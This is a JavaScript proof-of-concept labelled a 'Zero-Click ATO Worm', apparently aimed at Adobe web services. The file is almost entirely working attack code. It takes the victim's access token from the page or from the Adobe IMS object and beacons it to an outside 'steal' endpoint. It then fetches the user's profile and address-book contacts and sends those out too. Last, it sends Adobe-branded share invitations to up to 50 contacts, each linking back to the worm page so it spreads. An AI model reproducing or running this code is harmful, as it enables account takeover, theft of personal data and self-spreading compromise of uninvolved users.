/**
 * Zero-Click ATO Worm — r00tdaddy
 * Confirmed 2026-06-04
 *
 * Phase 1: Exfiltrate access_token (delivered via IMS prompt=none into fragment)
 * Phase 2: Enumerate victim's address book contacts
 * Phase 3: Send Adobe-branded invitation emails to all contacts
 *          with targetUrl = this page (maslibs worm URL)
 *          Adobe delivers via apo-prod.adobe.io/po-server/link/redirect
 *          Victims click Adobe email → land on this page → repeat
 */

const EXFIL    = 'https://klaltlv6.instances.httpworkbench.com/steal';
const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=main--mas--rootd4ddy';
const API_KEY  = 'projectx_webapp';
const INV_HOST = 'https://invitations.adobe.io';
const AB_HOST  = 'https://ab.adobe-identity.com';

async function run() {
  // ── Phase 1: grab token ──────────────────────────────────────────────────
  const hash = window.location.hash;
  const hashMatch = hash.match(/access_token=([^&]+)/);
  let token = hashMatch ? decodeURIComponent(hashMatch[1]) : null;

  if (!token) {
    const ims = window.adobeIMS;
    if (ims) token = ims.getAccessToken?.()?.token;
  }

  if (!token) {
    // Retry after IMS initializes
    await new Promise(r => setTimeout(r, 2000));
    token = window.adobeIMS?.getAccessToken?.()?.token;
  }

  if (!token) return;

  // Exfil token
  navigator.sendBeacon(`${EXFIL}?src=hash`, token);

  // Also grab profile
  fetch('https://ims-na1.adobelogin.com/ims/userinfo/v2', {
    headers: { 'Authorization': `Bearer ${token}` }
  }).then(r => r.json()).then(p => {
    navigator.sendBeacon(`${EXFIL}?src=profile`, JSON.stringify(p));
  }).catch(() => {});

  // ── Phase 2: enumerate address book ─────────────────────────────────────
  let emails = [];
  try {
    const abResp = await fetch(`${AB_HOST}/api/address-books?limit=50`, {
      headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY }
    });
    const abData = await abResp.json();
    const books = abData?._embedded?.addressBooks || [];

    for (const book of books) {
      const cResp = await fetch(
        `${AB_HOST}/api/address-books/${book.ident}/contacts?linkedIdentity=${encodeURIComponent('4904811169EBB3510A495FA1@AdobeID')}&limit=100`,
        { headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY } }
      );
      // Also try without linkedIdentity for full list
      const cResp2 = await fetch(
        `${AB_HOST}/api/address-books/${book.ident}/contacts?limit=100`,
        { headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY } }
      );
      const contacts = await cResp2.json().catch(() => ({}));
      const list = contacts?._embedded?.contacts || (Array.isArray(contacts) ? contacts : [contacts]);
      for (const c of list) {
        if (c?.email) emails.push(c.email);
      }
    }
  } catch (e) {}

  // ── Phase 3: get a project URN for the invitation ────────────────────────
  let urn = null;
  try {
    // Get root URN from IMS token (userId → root storage URN)
    const storageResp = await fetch(
      'https://platform-cs.adobe.io/content/storage/id/urn:aaid:sc:US:34493503-c74b-40e3-b73e-745f7ffdc644?expand=children&limit=5',
      { headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY } }
    );
    const storageText = await storageResp.text();
    // Find first project document URN (not directory)
    const projectMatch = storageText.match(/"repo:id":"(urn:aaid:sc:[^"]+)"/g);
    if (projectMatch && projectMatch.length > 1) {
      urn = projectMatch[1].replace(/"repo:id":"|"/g, '');
    }
  } catch (e) {}

  if (!urn || !emails.length) return;

  // Exfil the contact list
  navigator.sendBeacon(`${EXFIL}?src=contacts`, JSON.stringify(emails));

  // ── Phase 4: spread — invite each contact with maslibs targetUrl ─────────
  for (const email of emails.slice(0, 50)) {
    try {
      await fetch(`${INV_HOST}/api/v4/share/${encodeURIComponent(urn)}?mode=direct_acl`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'X-Api-Key': API_KEY,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          recipients: [{ recipient: `mailto:${email}`, role: 'editor', canComment: true, canShare: false }],
          notification: {
            ans: {},
            email: { sharing: { locale: 'en-US', templateName: 'cc_collab_fred_invite_to_edit_notification' } },
            parameters: { message: '', targetUrl: WORM_URL }
          },
          configuration: {}
        })
      });
    } catch (e) {}
  }
}

run();
